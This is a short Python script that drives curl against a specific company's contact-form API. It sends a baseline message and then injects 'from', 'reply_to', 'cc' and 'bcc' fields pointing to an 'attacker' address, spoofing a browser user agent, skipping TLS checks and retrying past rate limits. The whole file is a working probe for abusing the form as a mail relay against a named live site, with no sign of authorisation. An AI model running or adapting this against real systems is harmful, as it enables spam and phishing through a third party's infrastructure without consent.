import subprocess, time, json, sys
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
AT = chr(64)

def send(fields, gap=6):
    args = ["curl","-sk","-A",UA,"-X","POST","https://www.infinitycapital.bh/api/send",
            "-H","Content-Type: application/x-www-form-urlencoded"]
    for k,v in fields.items():
        args += ["--data-urlencode",k+"="+v]
    args += ["-o","/tmp/o5.bin","-w","%{http_code}"]
    r = subprocess.run(args,capture_output=True,text=True)
    time.sleep(gap)
    return open("/tmp/o5.bin","rb").read()[:300].decode("utf8","replace")

base = {"fname":"probe","lname":"sec","areacode":"973","tel":"5551234",
        "cname":"qa","subject":"hello","msg":"body","check":"on","targets":"probe"+AT+"mailinator.com"}

# Only run if we get a non-429, retry until success
def send_ok(fields, tries=8):
    for i in range(tries):
        r = send(fields)
        if "quota" not in r:
            return r
    return "ALL_429"

print("baseline:", send_ok(dict(base)))
for k in ["from","reply_to","cc","bcc"]:
    f = dict(base); f[k] = "attacker"+AT+"mailinator.com"
    print(k, "->", send_ok(f))
